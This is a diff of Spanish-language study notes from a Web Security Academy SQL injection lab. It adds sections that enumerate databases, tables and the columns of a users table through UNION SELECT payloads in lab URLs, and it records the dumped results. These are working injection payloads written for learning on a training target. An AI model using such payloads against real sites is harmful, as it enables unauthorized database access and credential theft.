@@ -74,6 +74,8 @@ https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '
 
     # OJO!!! `Depende el lado de la inyección irá el "UNION SELECT <--> schema_name"`
 
+# Enum Databases:
+
 ## Opt1 - Dump: schema_name = DBs 
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',schema_name FROM information_schema.schemata -- -
 ## Opt2 - Dump: schema_name = DBs
@@ -81,6 +83,8 @@ https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT s
     ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
     ### [DUMP = DB = 1. pg_catalog]
     ### [DUMP = DB = 2. public]
+
+# Enum Tables:
 
 ## Opt1 - Dump: table_name = Tables (TODAS)
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT  '1',table_name FROM information_schema.tables -- -
@@ -93,6 +97,16 @@ https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT t
     ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
     ### [DUMP = Table = 1. users]
     ### [DUMP = Table = 2. products]
+
+# Enum Columns:
+
+## Opt1 - Dump: table_name = Tables (SOLO database() en este caso 'public')
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users' -- -
+## Opt4 - Dump: table_name = Tables (SOLO database() en este caso 'public')
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT column_name,'2' FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users' -- -
+    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
+    ### [DUMP = Columns = 1. password]
+    ### [DUMP = Columns = 1. username]
 
 
 
